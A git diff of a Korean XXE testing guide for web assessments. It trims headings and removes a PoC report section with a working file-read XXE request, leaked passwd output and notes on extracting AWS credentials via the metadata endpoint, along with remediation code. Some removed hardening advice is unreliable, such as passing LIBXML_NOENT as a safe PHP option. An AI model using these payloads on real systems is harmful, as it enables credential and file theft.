@@ -1,13 +1,12 @@
 ---
 sidebar_position: 14
-title: XML 외부 엔티티 (XXE)
-description: 웹 진단 - XML External Entity 점검 절차, In-band/Blind 페이로드, SVG 업로드 케이스, 보고서 양식
+title: XXE
+description: 웹 진단 - XML External Entity 점검 절차, In-band/Blind 페이로드, SVG 업로드 케이스, 판정 기준
 keywords: [XXE, XML External Entity, Blind XXE, OOB, SVG, defusedxml, OWASP A05]
 draft: false
 ---
 
-# XML 외부 엔티티 (XML External Entity, XXE)
-
+# XML 외부 엔티티
 > XML 파서가 외부 엔티티(External Entity)를 그대로 처리하여, 공격자가 **로컬 파일 읽기** 또는 **내부 SSRF**를 발생시키는 취약점.
 > 클라우드 환경에서는 SSRF 경유로 IMDS 자격증명 탈취까지 이어질 수 있어 임팩트가 큼.
 
@@ -71,8 +70,7 @@ XML을 받는 엔드포인트를 후보로 잡는다. **Content-Type 헤더가 �
 
 엔티티 참조 결과가 응답에 노출되는 위치를 찾고, 영향이 큰 파일로 추출 범위 확장.
 
-### Step 4. Blind 판정 (OOB)
-
+### Step 4. Blind 판정
 응답에 흔적이 없을 때, **외부 DTD를 가져가도록 유도**해서 Collaborator 콜백을 확인.
 
 ### Step 5. 영향 입증
@@ -87,8 +85,7 @@ XML을 받는 엔드포인트를 후보로 잡는다. **Content-Type 헤더가 �
 
 ## 페이로드 / 테스트 케이스
 
-### 케이스 1: In-band 파일 읽기 (Linux/Windows)
-
+### 케이스 1: In-band 파일 읽기
 **언제 쓰는지**: Step 2에서 In-band 가능성이 확인된 경우. 가장 자주 통하는 기본 페이로드.
 
 ```xml
@@ -141,7 +138,7 @@ XML을 받는 엔드포인트를 후보로 잡는다. **Content-Type 헤더가 �
 <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>">
 ```
 
-**판정**: 응답에 `AccessKeyId`, `SecretAccessKey`, `Token` JSON이 노출되면 Critical. SSRF 페이지의 PoC 양식과 동일하게 활용.
+**판정**: 응답에 `AccessKeyId`, `SecretAccessKey`, `Token` JSON이 노출되면 Critical. SSRF 페이지의 클라우드 메타데이터 노출 판정 흐름과 동일하게 확인.
 
 ### 케이스 4: SVG 업로드를 통한 XXE
 
@@ -185,8 +182,7 @@ XML을 받는 엔드포인트를 후보로 잡는다. **Content-Type 헤더가 �
 
 > 파라미터 엔티티(`%`)가 단일 DTD 내부에서는 다른 엔티티 정의에 사용 불가하므로 **외부 DTD 분리**가 필수. 호스팅 가능한 외부 서버가 없으면 입증이 어려우므로, 사전에 Collaborator/interactsh 사용 가능 여부 확인.
 
-### 그 외 — 짧게 언급만 (실무 비중 낮음)
-
+### 그 외 — 짧게 언급만
 - **Billion Laughs (XML Bomb)** — 중첩 엔티티로 메모리 폭증을 유발하는 DoS 페이로드. 진단 보고서에서는 별도 결함으로 다루지 않고 Defense-in-Depth 권고로 정리하는 경우가 많음.
 - **`expect://` PHP RCE** — `expect.so` 확장이 설치된 환경 거의 없음. 발견 시 Critical이지만 우선순위 낮음.
 - **DOCX/XLSX 직접 편집해서 XXE 삽입** — SVG 업로드(케이스 4) 가 더 빠르고 자주 통함. DOCX는 ZIP 해제→`word/document.xml` 수정→재압축 절차 필요.
@@ -207,151 +203,6 @@ XML을 받는 엔드포인트를 후보로 잡는다. **Content-Type 헤더가 �
 
 - [ ] 단순 500 응답만 발생 (DOCTYPE 자체를 거부하는 정상 동작일 수 있음 — 에러 메시지 내용 확인)
 - [ ] 외부 콜백만 가능하고 파일 읽기/내부 접근은 차단 (이미 부분 방어 적용 — 영향도 낮음으로 보고)
-
----
-
-## PoC 양식 (보고서 붙여넣기용)
-
-**[XXE - In-band 파일 읽기] - 재고 조회 API `/api/stock`**
-
-1. `<TARGET>/api/stock` 엔드포인트가 `Content-Type: application/xml` 본문을 받는 것을 확인
-2. 본문에 DOCTYPE + 외부 엔티티 참조 페이로드 삽입
-3. 응답 본문에 `/etc/passwd` 내용 노출 확인
-
-**요청 (Request):**
-
-```http
-POST /api/stock HTTP/1.1
-Host: <TARGET>
-Content-Type: application/xml
-Cookie: SESSION=abcd1234
-
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<stockCheck>
-    <productId>&xxe;</productId>
-    <storeId>1</storeId>
-</stockCheck>
-```
-
-**응답 (Response) — 취약 발현 증거:**
-
-```http
-HTTP/1.1 200 OK
-Content-Type: application/json
-
-{
-  "error": "Invalid productId: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...'"
-}
-```
-
-**확인 사항:**
-- 응답의 `error` 필드에 `/etc/passwd` 파일 내용이 그대로 노출됨
-- 동일 패턴으로 `~/.aws/credentials`, 어플리케이션 설정 파일(DB 접속 정보 포함) 추출 가능
-- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` 페이로드로 IAM Role 자격증명 추출 가능 (별첨 스크린샷)
-
----
-
-## 영향도 분석
-
-- **기밀성 (Confidentiality)**: 🔴 **높음** — 서버 로컬 파일(설정·자격증명·소스코드) 노출. 클라우드 환경에서는 IMDS 경유 IAM 자격증명 탈취까지 가능.
-- **무결성 (Integrity)**: 🟡 — 일반적으로 파일 쓰기는 불가. 단, 탈취한 자격증명으로 다른 시스템 변조 가능.
-- **가용성 (Availability)**: 🟡 — Billion Laughs 같은 DoS 페이로드는 가능하나 진단 보고서에서는 별도 다루는 경우 적음.
-- **추가 위협**:
-  - **클라우드 계정 단위 침해** — IMDS → IAM 자격증명 → AWS API 호출
-  - **소스코드 유출 → 2차 공격** — 어플리케이션 로직/하드코딩 자격증명 분석으로 추가 침투
-
-**비즈니스 임팩트:**
-서버 파일 노출만으로도 DB 접속 정보·API 키·내부 시스템 정보가 유출되어 추가 침해의 기반이 된다. 클라우드 환경의 XXE는 SSRF와 결합되어 단일 결함으로 **계정 단위 침해**가 가능하므로 Critical로 분류.
-
----
-
-## 대응방안
-
-### 개발자 관점 (필수)
-
-XXE 방어의 정답은 거의 하나로 수렴: **DTD 처리와 외부 엔티티 참조를 파서 단에서 비활성화**. 입력 필터링이나 화이트리스트보다 이 한 줄 설정이 훨씬 확실함.
-
-**Java (DocumentBuilderFactory):**
-
-```java
-DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
-dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
-dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
-dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
-dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
-dbf.setXIncludeAware(false);
-dbf.setExpandEntityReferences(false);
-```
-
-**Python — `defusedxml` 사용 (표준 라이브러리는 안전하지 않음):**
-
-```python
-# 위험 — 표준 xml.etree.ElementTree 는 외부 엔티티 처리
-import xml.etree.ElementTree as ET
-tree = ET.fromstring(user_xml)
-
-# 안전 — defusedxml 사용
-from defusedxml import ElementTree as ET
-tree = ET.fromstring(user_xml)   # 외부 엔티티 자동 차단
-```
-
-**PHP:**
-
-```php
-// PHP 8.0+ 는 기본적으로 libxml 외부 엔티티 차단됨
-// 8.0 미만이면 명시적으로:
-libxml_disable_entity_loader(true);
-
-// SimpleXML / DOMDocument 사용 시
-$dom = new DOMDocument();
-$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);   // LIBXML_NONET: 외부 네트워크 차단
-```
-
-**.NET:**
-
-```csharp
-XmlReaderSettings settings = new XmlReaderSettings();
-settings.DtdProcessing = DtdProcessing.Prohibit;
-settings.XmlResolver = null;
-XmlReader reader = XmlReader.Create(stream, settings);
-```
-
-**Node.js (libxmljs / xml2js):**
-
-```javascript
-// xml2js 는 기본적으로 외부 엔티티 미처리 (안전)
-// libxmljs 사용 시 noent 옵션 끄기:
-const doc = libxmljs.parseXml(xml, { noent: false, dtdload: false });
-```
-
-### 운영자 관점
-
-1. **출구 트래픽 제어** — 어플리케이션 서버에서 외부로 나가는 HTTP/DNS 트래픽을 화이트리스트화. 외부 DTD fetch 와 OOB 콜백 모두 차단.
-2. **WAF 룰 적용** — `<!DOCTYPE`, `<!ENTITY`, `SYSTEM` 키워드 패턴 탐지 (보조 수단).
-3. **메타데이터 엔드포인트 보호** — AWS IMDSv2 강제 (SSRF 페이지 대응방안과 동일).
-
-### 안전 / 위험 코드 비교
-
-```python
-# 위험 — 표준 라이브러리 직접 사용
-import xml.etree.ElementTree as ET
-root = ET.fromstring(request.data)
-
-# 위험 — lxml 기본 설정 (resolve_entities=True 가 기본)
-from lxml import etree
-parser = etree.XMLParser()
-root = etree.fromstring(request.data, parser)
-
-# 안전 — defusedxml
-from defusedxml import ElementTree as ET
-root = ET.fromstring(request.data)
-
-# 안전 — lxml 명시적 설정
-from lxml import etree
-parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)
-root = etree.fromstring(request.data, parser)
-```
 
 ---
 
